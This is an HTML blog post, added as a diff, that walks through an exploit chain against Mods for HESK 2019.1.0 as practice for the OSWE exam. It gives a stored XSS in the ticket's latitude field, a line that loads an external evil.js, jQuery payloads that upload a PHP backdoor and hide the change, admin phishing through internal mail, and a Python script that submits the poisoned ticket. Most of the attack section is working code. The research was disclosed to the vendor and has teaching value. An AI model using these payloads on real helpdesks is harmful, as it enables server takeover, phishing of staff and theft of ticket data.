@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<title>OSWE exam preparation: The loca1gh0st exercise</title>
+<link href="https://fonts.googleapis.com/css2?family=Ubuntu&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/main.css">
+
+<meta property="og:title" content="A journey to Offensive Security Web Expert">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Just some information about my journey to Offensive Security Web Expert (OSWE) certification by Offensive Security">
+<meta property="og:description" content="Just some information about my journey to Offensive Security Web Expert (OSWE) certification by Offensive Security">
+<meta property="og:url" content="https://loca1gh0s7.github.io/awae-to-oswe">
+<meta property="og:site_name" content="loca1gh0s7.github.io">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2020-03-21T02:30:00+00:00">
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div class="container">
+    <a href="https://loca1gh0s7.github.io/">
+      <h1>loca1gh0s7@blog:~$</h1>
+    </a>
+    <h2>Just some letters placed in a significant order, making up words and hopefully meaning</h2>
+    <div class="header-links">
+      <a href="/" class="btn"><h2 class="header-link">loca1gh0s7</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h1>From unauthenticated stored XSS to RCE</h2>
+  <time datetime="2020-06-25T23:30:00+00:00" class="by-line">
+     Thursday, June 25th , 2020</time>
+
+<p>I am sharing this believing it could serve as some extra "material" for the Advanced Web Attacks and Exploitation <span class="paranthesis">(AWAE)</span> course and Offensive Security Web Expert <span class="paranthesis">(OSWE)</span> exam. I found a lot of similarities with the applications in the AWAE course and therefore believe it would be a nice addition to exam preparation. If you want the most out of this, I suggest you download and install Mods for HESK <span class="paranthesis">(MFH)</span> 2019.1.0 yourself, and postpone the reading of this blogpost. Spoiler alert: I go through XSS to RCE in detail, but I leave the SQL injection as an exercise</p>
+
+<p>At one point in time <span class="paranthesis">(May/June 2020)</span> I looked into an installation of PHP helpdesk software, HESK 2.8.6 <span class="paranthesis">(open source)</span> with "Mods for HESK 2019.1.0" <span class="paranthesis">(latest version at that time)</span> installed. Open source is great for security researchers and also hackers. So I downloaded the latest version <span class="paranthesis">(2.8.6)</span> of HESK2 and started code review on parts that accepted user-input. After a couple of hours, this did not reveal any vulnerabilities <span class="paranthesis">(at least for my eyes)</span>. I get the feeling "there is nothing here". I thought to myself that I'm not going to find anything in the mod software, completely forgetting how powerful mods can be in the open source world. They can easily modify core parts of the software.</p>
+
+<p>I Downloaded Mods for HESK 2019.1.0 and went for the install directory. As with the HESK software this also refuses to run unless you remove the install directory after installation, which is great practice in my opinion. I logged in to the admin area to look around - taking the "tour". This is always a good way to start - get familiar with the app you are testing or code-reviewing.</p>
+
+<p>In my exploration of the app I noticed the possibility of uploading attachments is enabled by default. I also discovered the UI colors part of MFH addon in settings, making a note of the possibility to add images to the UI. I wanted a way in so I kept looking at user input, especially where a anonymous user could submit a ticket with file upload. Burp was already enabled and willing, so I submitted a ticket:</p>
+
+<p><img src="../assets/1-burp.png" alt=""></p>
+
+<p>I notice 4 fields not present in original HESK. That is interesting. Figuiring <code>screen_resolution_height</code> and <code>screen_resolution_width</code> would not get me anywhere as they are pure integers I focus on <code>latitude</code> and <code>longitude</code>. Although I am somewhat familiar with the HESK software source at this point, I find it quicker and more exciting to test XSS payload through Burp and check the page source where I expect these values to be displayed / used.</p>
+
+<p><code>&lt;script&gt;alert('latitude')&lt;/script&gt;</code></p>
+<p><code>&lt;script&gt;alert('longitude')&lt;/script&gt;</code></p>
+
+<p><img src="../assets/2-burp-xss.png" alt=""></p>
+
+<p>So that is what I do, I inject both longitude and latitude with the "standard basic" XSS payload. I ship it and response says:
+Your ticket has been successfully submitted! Ticket ID: Q95-JAY-H8LZ. So far so good, now I will log into the helpdesk and view the ticket. It always tingles in my stomach when I see this:</p>
+
+<p><img src="../assets/3-xss-success-longitude.png" alt=""></p>
+
+<p>Well, longitude is injectable, but why didn't the latitude payload fire?
+Inspecting the page source it is revealed that we actually land directly into JavaScript and there is no need for script tags. The script tags actually broke the latitude injection and the rest of JavaScript after longitude. This is also what devtools and console is telling us:</p>
+
+<p><img src="../assets/4-source-xss.png" alt=""></p>
+<p><img src="../assets/5-devtools-xss.png" alt=""></p>
+
+<p>Let us fix it by chaning payloads to:</p>
+<p><code>1;alert('stored XSS are the best!')</code></p>
+<p><code>1;alert('but how much space is available?')</code></p>
+
+<p><img src="../assets/6-burp-xss.png" alt=""></p>
+<p>I rip out all cookies (to avoid the <code>$_SESSION['already_submitted']</code> to ever become set) and ship it!
+I get another ticket Q2U-JDN-YXDU! Clicking the ticket in the admin panel...</p>
+
+<p><img src="../assets/7-xss.png" alt=""></p>
+<p><img src="../assets/8-xss.png" alt=""></p>
+<p>Perfect! It blends in beautifully.</p>
+<p>Yes yes, I know what you are thinking, can we steal the session cookie?
+Nope, not in the latest version of MFH at least. So what CAN we do?</p>
+<p><img src="../assets/9-http-only.png" alt=""></p>
+<p>In my previous research into HESK, I noticed upload attachment functionality.
+As an admin you can change allowed extensions for attachment upload. Music in hacker ears! Craft XSS to change settings to allow for php file upload, submit ticket with attachment and use XSS in the ticket to determine the filename - then go for it and we have RCE! Always test your train of thought manually before typing up the script to attack. I did and I am glad. Cause there was something very nice lurking in the source:</p>
+<p><img src="../assets/10-attachments.png" alt=""></p>
+
+<p>No PHP extension for you! Well, should the webserver execute php2, php6 or php7 you are in luck - but that is a conditional we cannot base an attack on. Remember the upload picture functionality in MFH UI addon? I quickly go to the bottom of the settings page and upload a file for Login Box Header image. I selected a cute little PHP file:</p>
+<p><code>&lt;?php echo "Stored XSS is sexy but I really <3 RCE"; ?&gt;</code></p>
+
+<p>Again, I could read the source to determined if this vector was possible, but I think is so much quicker just using the applications functions to test the first step in this direction, if not successful we would dig into source code.</p>
+
+<p><img src="../assets/11-burp-rce-upload.png" alt=""></p>
+<p><img src="../assets/12-admin-upload-success.png" alt=""></p>
+<p><img src="../assets/13-backdoor-location.png" alt=""></p>
+
+<p>As you can see there is nothing stopping me from uploading a PHP file here.
+Navigating to the login screen, I find the picture, or at least its placeholder.
+finding the 'src' attribute reveals the backdoor being put into /cache folder.
+Opening it in another tabs gives us what every hacker wants, code execution on the webserver.</p>
+<p><img src="../assets/14-rce.png" alt=""></p>
+
+<p>Now we know what we want, but how can we achieve it, can we bring the entire JavaScript payload into the database? We run into the hesk databse: <code>mysql -u root</code> and <code>use hesk;</code> then <code>describe hesk_tickets;</code>. This reveals that we have 100 characters to play with in each of longitude and latitude. Well, we could probably get away with that, but I don't have time for micro-optimizing code although a really enjoy it.</p>
+
+<p><img src="../assets/15-mysql.png" alt=""></p>
+
+<p>We will cross the CSP bypass <span class="paranthesis">(for instance by leveraging attachments :D)</span> bridge some other day, for now I will settle with loading an external script. There is a thousand ways to do it, but I went for <span class="paranthesis">(localhost works here because I am attacking the webapp installed locally)</span>: </p>
+<p><code>1;&lt;/script&gt;&lt;script src='http://localhost/js/evil.js'/&gt;&lt;script&gt;//</code></p> 
+<p>Not fan of red lines with text in console window of devtools, I add the comments on the end to comment out the semi-colon not under our control.<p>
+
+<p>Now jQuery is already present, that will make some things easier <span class="paranthesis">(at least for me)</span>.
+Crafting the payload within an IIFE <span class="paranthesis">(Immediately Invoked Function Expression)</span> waiting for the DOM to load:</p>
+<code><pre>
+(function(){
+  $(document).ready(function () {
+    $.get( "/admin/admin_settings.php", function(htmldata) {
+      var f = $('form[name="form1"]', $(htmldata));
+      // We will try to upload RCE payload
+      var fd = new FormData(f[0]);
+      fd.set('login-box-header', 'image');
+      var blob = new Blob(["&lt;?php echo shell_exec('id'); ?&gt;"], {
+        type: 'application/x-php'
+      });
+      fd.set('login-box-header-image', blob, 'whateverdontmatter.php'); /* Check it out: https://www.youtube.com/watch?v=w8QH93jWZbk */
+      $.ajax({
+        url: $(f).attr('action'),
+        data: fd,
+        processData: false,
+        contentType: false,
+        type: 'POST',
+        success: function(data){
+          // This is incorrect, page returns 200 either way and I am also being lazy with the printout of the backdoor, but this is just a PoC :D
+          console.log("Seems we were successful, check the door: http://localhost/cache/lbh_login-box-header-image.php");
+        }
+      });
+      // Remember to reset login-box-header to helpdesk-title and save settings again
+      var reset = new FormData(f[0]);
+      $.ajax({
+        url: $(f).attr('action'),
+        data: reset,
+        processData: false,
+        contentType: false,
+        type: 'POST',
+        success: function(data){
+          console.log("Cleanup done...");
+        }
+      });
+    }
+  });
+})()
+</pre></code>
+
+<p>I noticed that the PHP file is not deleted if I change the setting back. Stealth is offered, as you can see in the script above, we take it.
+There we have it, a stealthy gh0st exploit resulting in RCE on target webserver! Well, this makes the assumption that this evil ticket lands with the admin user of the helpdesk system. We all know whose mother assumption really is. So let's improve on this.</p>
+
+<p>Imagine the ticket is automatically assigned to a limited user. If that is the case, we can reassign it to an admin user :D.
+Doing some more research reveals that the send message to other users' page actually seems to list all registered users of the HESK admin area.</p>
+<p>That's helpful, what's more - the userid is exposed as well. Unless someone has messed greatly with the installation of HESK, userid 1 will always be an admin user. It cannot be deleted nor demoted.</p>
+<p>Further XSS seems impossible in these fields, but looking at the mail.php <code>$_SESSION['mail']['message'] = hesk_makeURL($_SESSION['mail']['message']);</code> tells us that url's will be Interpreted as links.
+
+Armed with this knowledge, we make our payload request the admin/mail.php page to get the lowest number user in the list <span class="paranthesis">(except 0)</span> and either reassign the ticket to admin user if we have sufficient privileges to do so, or otherwise phish the admin user with an intriguing message linking to our poisoned ticket :D.</p>
+
+<code><pre>
+(function(){
+  $(document).ready(function () {
+    var token = 0;
+    var ticket = "";
+    var sendIt = function(url, postdata) { 
+      $.post(url,postdata);
+      return "hey";
+    };
+    var parseAdmin = function(htmldata) {
+      var f = $('form[name="form2"]', $(htmldata));
+        var u = $(f[0][1]);
+      var a = [];
+      $(u[0]).find('option').each(function(i,v) {
+        if(v.value != 0) { a[v.value] = v.text }  
+      });
+      if (a[1] != null) {
+        return 1; 
+      } else {
+        // We assume that next user that was created after admin has privs...
+        for (uu in a) {
+          if(a.hasOwnProperty(uu)) {
+            return uu;
+          }
+        } 
+      }
+    };
+    var getMailInfo = function() {
+      return $.when($.get('/admin/mail.php'));
+    };
+    var reAssignPayload = function(reAssignTo) {
+      data = {
+        "owner": reAssignTo,
+        "track": ticket,
+        "token": token
+      };
+      sendIt('/admin/assign_owner.php', data);
+    }
+    var sendMessage = function(token, recipient) {
+      var data = {
+        "to": recipient, 
+        "subject":"I need your input on this ticket",
+        "message":"Please read the log for ticket: " + window.location.href + "\n\nWhat do you think?\nThanks.",
+        "signature":1,
+        "token":token,
+        "a":"send"};
+      sendIt("/admin/mail.php", data)
+    };
+    var passThePayload = function() {   
+      getMailInfo().then(function(data) {
+        console.log("Passing payload to someone important...");
+        var adminOrnextBestThing = parseAdmin(data);
+        if ($('#changeOwnerForm').html()) {
+          // We can assign someone, go for it
+          console.log("We are allowed to reassign, attempting reassign to admin...");
+          reAssignPayload(adminOrnextBestThing);
+        }
+        else {
+          // Best we can do is send a phishing message with link to payload
+          console.log("Reassign denied, we'll go phishing admin with message...");
+          sendMessage(token, adminOrnextBestThing);
+        }
+      });
+    };
+    ticket = $('#changePriorityForm input[name="track"]').val();
+    token = $('#changePriorityForm input[name="token"]').val();
+    // testing if we can reach settings
+    $.get( "/admin/admin_settings.php", function(htmldata) {
+    var f = $('form[name="form1"]', $(htmldata));
+    if(!f[0]) {
+      passThePayload();
+    }
+    else {
+      // We get the page, can we submit settings??
+      $.ajax({
+        url: $(f).attr('action'),
+        type: 'POST',
+        data : $(f).serialize(),
+        success: function(response){
+        var error = $('div.alert.alert-danger', $(response));
+        if(error[0]) {
+          // There are errors
+          console.log('There are errors...');
+          $(error).each(function(i,v) {
+            var er = $(v).find('a')[0];
+            if($(er).attr('href') == "index.php") {
+              console.log('No access to save settings...');
+              passThePayload();
+            }
+          });
+        }
+        else {
+          console.log("Seems we have access to save settings, building backdoor...");
+          // We will try to upload RCE payload
+          var fd = new FormData(f[0]);
+          fd.set('login-box-header', 'image');
+          var blob = new Blob(["&lt;?php echo shell_exec('id'); ?&gt;"], {
+            type: 'application/x-php'
+          });
+          fd.set('login-box-header-image', blob, 'whatever.php');
+          $.ajax({
+            url: $(f).attr('action'),
+            data: fd,
+            processData: false,
+            contentType: false,
+            type: 'POST',
+            success: function(data){
+              console.log("Seems we were successful, check the door: http://localhost/cache/lbh_login-box-header-image.php");
+            }
+          });
+          // Remember to reset login-box-header to helpdesk-title and save settings again
+          var reset = new FormData(f[0]);
+          $.ajax({
+            url: $(f).attr('action'),
+            data: reset,
+            processData: false,
+            contentType: false,
+            type: 'POST',
+            success: function(data){
+              console.log("Cleanup done...");
+            }
+          });
+        }
+      }});
+    }
+  });
+}); 
+})()
+</pre></code>
+
+<p>Now that's a lot better <span class="paranthesis">(except for my coding skills :D)</span>. Let's compliment this payload with a python script exploiting the XSS vulnerability:</p>
+
+<code><pre>
+#!/usr/bin/python
+import sys
+import requests
+
+def submitEvilTicket(target, payloadlocation):
+  proxies = {'http': 'http://127.0.0.1:8080'} # Debug
+  target = "%s/submit_ticket.php?submit=1" % target
+  data = {
+    'name': 'loca1gh0st',
+    'email': 'loca1gh0st@localhost',
+    'priority': '3',
+    'subject': 'You have a gh0st in the shell very soon',
+    'message': 'Duh-duh, duh duh. Who you gonna call? (loca1)gh0st busters!',
+    'latitude': '1;&lt;/script&gt;&lt;script src="%s"&gt;&lt;/script&gt;&lt;script&gt;//' % payloadlocation, # Stored XSS up to 100 chars
+    'longitude': '1', # Stored XSS here to up to 100 chars
+    'screen_resolution_height': 123, # SQL injection here, not used in this exploit
+    'screen_resolution_width': 123, # SQL injection here, not used in this exploit
+    'token': 'whatever',
+    'category': '1',
+    'hx': '3',
+    'hy': ''
+  }
+
+  r = requests.post(target, data=data, proxies=proxies)
+
+  res = r.text
+  if "ticket.php?track=" in res:
+    print "Ticket submitted, now a user would need to view the ticket:\n"
+    # If you like you could bs, grep or regex for the Ticket ID, but that's on you
+    return True
+  return False
+
+def main():
+  if len(sys.argv) != 3:
+    print "(+) usage: %s &lt;targetandpath&gt; &lt;payloadtarget&gt;" % sys.argv[0]
+    print "(+) eg: %s https://192.168.121.103/hesk http://10.10.10.123/gh0st-inject.js" % sys.argv[0]
+    sys.argv[0]
+    sys.exit(-1)
+
+  target = sys.argv[1];
+  payload = sys.argv[2];
+
+  if submitEvilTicket(target, payload):
+    print "(+) We successfully sent a gh0st in the envelope"
+    print "(+) if target is between version -2019.1.0- and -June 28 2017 Version 3.1.0-"
+    print "(+) you should expect great success"
+
+  else:
+    print "(-) That failed, check your target path and if they have enabled captcha or equivalent!"
+    print "(-) If there is captcha involved do this step through you favorite proxy which is Burp!"
+if __name__ == "__main__":
+  main()
+
+</pre></code>
+
+<p>Note that this will not work if the target has some kind of captcha enabled <span class="paranthesis">(not enabled by default)</span>. But that is just one request for you to send via Burp if need be. At last, remember the <code>screen_resolution_height</code> and <code>screen_resolution_width</code> in submit_ticket.php?
+Well, they are actually both vulnerable to SQL injection. We did not need this vulnerability to bypass authentication here. This attack should work on Mods for HESK versions between -2019.1.0- and -June 28 2017 Version 3.1.0- as these are vulnerable to SQL injection, XSS and RCE.</p>
+
+<p>What if RCE is out of the picture? For example in versions below 3.1.0 there are no UI image upload functionality.
+Well, we can still bypass authentication with session riding. But what if we need to log in as admin user? Here the SQL injection vector becomes interesting. I leave it as an exercise for AWAE students <span class="paranthesis">(and anyone else of course)</span> to leverage SQL injection to add admin password hash to a ticket and XSS to exfiltrate  the data to build a autologin token for the admin user. A hint: You will need to submit at least 4 <span class="paranthesis">(please correct me if I am wrong)</span> evil tickets, and collect at least one of the ticket ID's.</p>
+
+<p>In closing I would like to say that these vulnerabilities are serious as an attacker can exfiltrate all data on every ticket ever submitted and further reply to these tickets with malicious payloads in form of attachments. The vulnerabilities were reported quickly to the software author which in turn responded promptly and professionally. I would strongly recommend users of this software to update to the latest version of MFH - Mods for HESK and if possible, make the transition into the original HESK as the MFH is no longer maintained.</p>
+
+<p>Good luck if OSWE exam preparation brought you here and happy hunting!</p>
+
+</article>
+
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://twitter.com/loca1GH0ST"><img src="../assets/tw-white.png" alt="Twitter" class="social-link"></a>
+  <a href="#" class="license-link">
+    loca1gh0st © 2020
+  </a>
+</footer>
+</body></html>
